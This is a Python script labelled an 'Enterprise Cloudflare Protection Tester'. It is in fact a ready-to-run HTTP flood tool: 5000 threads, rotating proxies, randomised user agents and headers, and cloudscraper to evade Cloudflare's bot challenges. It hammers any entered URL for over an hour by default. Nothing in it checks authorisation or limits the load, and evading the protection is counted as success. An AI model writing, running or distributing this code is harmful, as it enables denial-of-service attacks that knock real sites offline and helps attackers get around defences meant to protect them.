import cloudscraper
import random
import time
import threading
import sys
import os
import socket
import socks
from fake_useragent import UserAgent
from colorama import Fore, Style, init
import requests
from concurrent.futures import ThreadPoolExecutor, as_completed
import warnings
warnings.filterwarnings("ignore")

# Initialize colorama
init()

# Configuration
MAX_THREADS = 5000  # Thread count for maximum throughput
REQUEST_TIMEOUT = 15  # Seconds before request times out
PROXY_TIMEOUT = 10  # Seconds before proxy connection times out
TEST_DURATION = 4200  # Default test duration in seconds

class ProtectionTester:
    def __init__(self):
        self.proxies = self.load_proxies()
        self.user_agents = UserAgent()
        self.success_count = 0
        self.failed_count = 0
        self.blocked_count = 0
        self.cf_bypassed = 0
        self.lock = threading.Lock()
        self.running = True
        self.test_start = 0
        self.session = None

    def load_proxies(self):
        """Load and validate proxies from multiple sources"""
        proxy_sources = [
            "proxies.txt",
            "http_proxies.txt",
            "socks_proxies.txt",
            "premium_proxies.txt"
        ]
        
        proxies = set()
        
        for source in proxy_sources:
            if os.path.exists(source):
                with open(source, "r") as f:
                    for line in f:
                        proxy = line.strip()
                        if proxy and self.validate_proxy(proxy):
                            proxies.add(proxy)
        
        return list(proxies) if proxies else [None]

    def validate_proxy(self, proxy):
        """Quick proxy validation check"""
        try:
            ip, port = proxy.split(":")
            socket.inet_aton(ip)
            if 1 <= int(port) <= 65535:
                return True
        except:
            return False
        return False

    def get_random_proxy(self):
        """Get random proxy with fallback to direct connection"""
        return random.choice(self.proxies) if self.proxies else None

    def create_scraper(self, proxy=None):
        """Create configured cloudscraper instance"""
        scraper = cloudscraper.create_scraper(
            browser={
                'custom': self.user_agents.random,
                'platform': random.choice(['windows', 'linux', 'mac']),
                'mobile': random.choice([True, False])
            },
            delay=random.uniform(0.1, 0.5),
            interpreter='native'
        )
        
        if proxy:
            proxy_url = f"http://{proxy}" if not proxy.startswith(('http://', 'https://')) else proxy
            scraper.proxies = {
                'http': proxy_url,
                'https': proxy_url
            }
        
        return scraper

    def send_request(self, target_url):
        """Send request with random configuration"""
        proxy = self.get_random_proxy()
        try:
            scraper = self.create_scraper(proxy)
            
            # Random headers for each request
            headers = {
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                'Accept-Language': random.choice(['en-US,en;q=0.5', 'fr,fr-FR;q=0.8', 'de,de-DE;q=0.7']),
                'Accept-Encoding': random.choice(['gzip, deflate', 'br']),
                'Connection': random.choice(['keep-alive', 'close']),
                'Upgrade-Insecure-Requests': '1',
                'Cache-Control': random.choice(['max-age=0', 'no-cache']),
                'TE': random.choice(['Trailers', 'compress'])
            }
            
            # Randomize request method
            method = random.choice(['GET', 'POST']) if random.random() > 0.8 else 'GET'
            
            start_time = time.time()
            
            if method == 'POST':
                response = scraper.post(target_url, headers=headers, timeout=REQUEST_TIMEOUT,
                                      data={'test': ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=8))})
            else:
                response = scraper.get(target_url, headers=headers, timeout=REQUEST_TIMEOUT)
            
            elapsed = time.time() - start_time
            
            with self.lock:
                self.success_count += 1
                
                status_color = Fore.GREEN if response.status_code == 200 else Fore.YELLOW
                print(f"{status_color}[{response.status_code}] {elapsed:.2f}s {proxy or 'DIRECT'}{Style.RESET_ALL}")
                
                if "cloudflare" in response.text.lower() and response.status_code == 200:
                    self.cf_bypassed += 1
                    print(f"{Fore.CYAN}[+] Cloudflare bypassed ({self.cf_bypassed} times){Style.RESET_ALL}")
                elif response.status_code in [403, 503]:
                    self.blocked_count += 1
                    print(f"{Fore.RED}[!] Request blocked ({self.blocked_count} times){Style.RESET_ALL}")
                
        except Exception as e:
            with self.lock:
                self.failed_count += 1
                print(f"{Fore.RED}[X] Failed: {str(e)[:50]}{Style.RESET_ALL}")

    def print_stats(self):
        """Display real-time statistics"""
        while self.running:
            os.system('cls' if os.name == 'nt' else 'clear')
            elapsed = time.time() - self.test_start
            req_rate = (self.success_count + self.failed_count) / elapsed if elapsed > 0 else 0
            
            print(f"""
{Fore.YELLOW}=== Enterprise Protection Testing Tool ==={Style.RESET_ALL}
Target: {self.target_url}
Duration: {elapsed:.1f}s
Threads: {MAX_THREADS}
Proxy Pool: {len(self.proxies) if self.proxies else 'DIRECT'}

{Fore.GREEN}Successful: {self.success_count}{Style.RESET_ALL}
{Fore.RED}Failed: {self.failed_count}{Style.RESET_ALL}
{Fore.MAGENTA}Blocked: {self.blocked_count}{Style.RESET_ALL}
{Fore.CYAN}CF Bypassed: {self.cf_bypassed}{Style.RESET_ALL}

Request Rate: {req_rate:.1f}/sec
            """)
            time.sleep(1)

    def run_test(self, target_url, duration=TEST_DURATION):
        """Main test execution"""
        self.target_url = target_url
        self.test_start = time.time()
        
        # Start stats thread
        stats_thread = threading.Thread(target=self.print_stats, daemon=True)
        stats_thread.start()
        
        # Main test loop
        try:
            with ThreadPoolExecutor(max_workers=MAX_THREADS) as executor:
                futures = []
                while time.time() - self.test_start < duration and self.running:
                    futures.append(executor.submit(self.send_request, target_url))
                    time.sleep(0.001)  # Minimal delay for thread creation
                
                for future in as_completed(futures):
                    pass  # Just wait for completion
                    
        except KeyboardInterrupt:
            print(f"\n{Fore.YELLOW}[!] Test interrupted by user{Style.RESET_ALL}")
        finally:
            self.running = False
            stats_thread.join()
            self.show_final_report()

    def show_final_report(self):
        """Display comprehensive final report"""
        elapsed = time.time() - self.test_start
        total_requests = self.success_count + self.failed_count
        success_rate = (self.success_count / total_requests * 100) if total_requests > 0 else 0
        
        print(f"""
{Fore.YELLOW}=== TEST COMPLETE ==={Style.RESET_ALL}
Test Duration: {elapsed:.1f} seconds
Total Requests: {total_requests}
Successful Requests: {self.success_count} ({success_rate:.1f}%)
Failed Requests: {self.failed_count}
Cloudflare Bypasses: {self.cf_bypassed}
Requests Blocked: {self.blocked_count}
Average Throughput: {(total_requests/elapsed):.1f} requests/second

{Fore.CYAN}Protection Effectiveness Analysis:{Style.RESET_ALL}
- Cloudflare Detection Rate: {(self.blocked_count/self.success_count*100 if self.success_count > 0 else 0):.1f}%
- Bypass Success Rate: {(self.cf_bypassed/self.success_count*100 if self.success_count > 0 else 0):.1f}%
        """)

if __name__ == "__main__":
    print(f"{Fore.YELLOW}=== Enterprise Cloudflare Protection Tester ==={Style.RESET_ALL}")
    print(f"Threads: {MAX_THREADS} | Proxy Support: Enabled | Advanced Bypass Techniques")
    
    tester = ProtectionTester()
    
    if not tester.proxies:
        print(f"{Fore.RED}[!] No valid proxies found in proxies.txt - using direct connections{Style.RESET_ALL}")
    
    target_url = input("Enter target URL (with http/https): ")
    duration = int(input(f"Test duration in seconds (default {TEST_DURATION}): ") or TEST_DURATION)
    
    print(f"\n{Fore.GREEN}[+] Starting test with {MAX_THREADS} threads...{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}[!] Press CTRL+C to stop the test{Style.RESET_ALL}\n")
    
    tester.run_test(target_url, duration)